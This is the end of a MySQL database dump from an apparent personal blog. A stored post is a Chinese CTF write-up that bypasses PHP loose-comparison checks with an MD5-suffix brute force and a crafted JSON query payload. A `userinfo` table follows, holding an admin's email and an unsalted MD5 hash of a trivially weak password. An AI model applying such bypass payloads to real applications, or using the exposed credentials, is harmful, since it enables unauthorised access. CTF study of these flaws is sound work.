\'8b184b\'`。所以要找一个数字或字符串，经过**md5**加密后最后六位为`8b184b`。\r\n\r\n跑个代码就得到了，得到结果为53724。\r\n\r\n```python\r\nimport hashlib\r\nfor i in range(0, 100000):\r\n    hl=hashlib.md5()\r\n    s = str(i)\r\n    hl.update(s.encode(encoding=\'utf8\'))\r\n    md5=hl.hexdigest()\r\n    if str(md5)[-6:] == \"8b184b\":\r\n        print(s + \":\" +  str(md5))\r\n        break\r\n```\r\n\r\n所以**b=53724**。\r\n\r\n**a**和**b**解决之后就可以让`$key1=1`了。\r\n\r\n# 参数c\r\n\r\n{% tip warning %}这一个参数应该是最难的，反正我是搞了很久。{% endtip %}\r\n\r\n```php\r\n$c=(array)json_decode(@$_GET[\'c\']);\r\nif(is_array($c) && !is_numeric(@$c[\"m\"]) && $c[\"m\"] > 2022){\r\n    if(is_array(@$c[\"n\"]) && count($c[\"n\"]) == 2 && is_array($c[\"n\"][0])){\r\n        $d = array_search(\"DGGJ\", $c[\"n\"]);\r\n        $d === false?die(\"no...\"):NULL;\r\n        foreach($c[\"n\"] as $key=>$val){\r\n            $val===\"DGGJ\"?die(\"no......\"):NULL;\r\n        }\r\n        $key2 = 1;\r\n    }else{\r\n        die(\"no hack\");\r\n    }\r\n}else{\r\n    die(\"no\");\r\n}\r\n```\r\n\r\n第一行可知，传入的**c**应该是一个**JSON**格式的字符串，然后解析成数组。\r\n\r\n首先判断`@$c[\"m\"]`是否为数字，如果是就寄了。还需要满足`$c[\"m\"]`大于2022。\r\n\r\n```php\r\nif(is_array($c) && !is_numeric(@$c[\"m\"]) && $c[\"m\"] > 2022)\r\n```\r\n\r\n又是弱类型比较，第一部分这样就可以了。\r\n\r\n```json\r\n{\r\n    \"m\":\"2023a\",\r\n}\r\n```\r\n\r\n`@$c[\"n\"]`为含两个元素的数组，且`$c[\"n\"][0]`也为数组。\r\n\r\n```php\r\nif(is_array(@$c[\"n\"]) && count($c[\"n\"]) == 2 && is_array($c[\"n\"][0]))\r\n```\r\n\r\n所以继续补充如下。\r\n\r\n```json\r\n{\r\n    \"m\":\"2023a\",\r\n    \"n\": [\r\n        [1, 2, 3],\r\n        [4, 5, 6]\r\n    ]\r\n}\r\n```\r\n\r\n最后一部分了。\r\n\r\n```php\r\n$d = array_search(\"DGGJ\", $c[\"n\"]);\r\n        $d === false?die(\"no...\"):NULL;\r\n        foreach($c[\"n\"] as $key=>$val){\r\n            $val===\"DGGJ\"?die(\"no......\"):NULL;\r\n        }\r\n```\r\n\r\n`$d = array_search(\"DGGJ\", $c[\"n\"]);$d = = = false?die(\"no...\"):NULL;`这两句，在数组`$c[\"n\"]`中寻找**DGGJ**，所以继续补充我们的**c**如下。\r\n\r\n```json\r\n{\r\n    \"m\":\"2023a\",\r\n    \"n\": [\r\n        [1, 2, 3],\r\n        \"DGGJ\"\r\n    ]\r\n}\r\n```\r\n\r\n这段代码遍历`$c[\"n\"]`数组中的值，如果出现了**DGGJ**则退出进程。得想点办法绕过去。\r\n\r\n```php\r\nforeach($c[\"n\"] as $key=>$val){\r\n	$val===\"DGGJ\"?die(\"no......\"):NULL;\r\n}\r\n```\r\n\r\n还是回到`array_search()`这个函数，把**c**中的`DGGJ`换成`0`即可。\r\n\r\n这里的`array_search()`没有设置**strict**参数（如果该参数被设置为 TRUE，则函数在数组中搜索数据类型和值都一致的元素），我们就可以用`0`和`DGGJ`进行弱比较，`0 == \'DGGJ\'`。\r\n\r\n这样最后的**c**就整出来了。\r\n\r\n```json\r\n{\r\n    \"m\":\"2023a\",\r\n    \"n\": [\r\n        [1, 2, 3],\r\n        0\r\n    ]\r\n}\r\n```\r\n\r\n# 拿下flag\r\n\r\n所以最后`payload`为：\r\n\r\n```plaintext\r\n?a=6e7&b=53724&c={\"m\":\"2023a\",\"n\":[[1,2,3],0]}\r\n\r\n#url编码\r\n?a=6e7&b=53724&c=%7B%22m%22%3A%222023a%22%2C%22n%22%3A%5B%5B1%2C2%2C3%5D%2C0%5D%7D\r\n```\r\n\r\n拿下**flag**\r\n\r\n![image-20220926220154599](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/22/9/27/image-20220926220154599.png)',3,'1670930021615','https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/be71a5a30dc29db32c2da01fc7de3009.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080');

/*Table structure for table `userinfo` */

DROP TABLE IF EXISTS `userinfo`;

CREATE TABLE `userinfo` (
  `name` varchar(50) DEFAULT NULL,
  `email` varchar(50) DEFAULT NULL,
  `password` varchar(50) DEFAULT NULL,
  `islogin` int(1) DEFAULT NULL,
  `img` varchar(100) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

/*Data for the table `userinfo` */

insert  into `userinfo`(`name`,`email`,`password`,`islogin`,`img`) values ('admin','652240843@qq.com','e10adc3949ba59abbe56e057f20f883e',1,'https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/2022/10/toux.jpg');

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
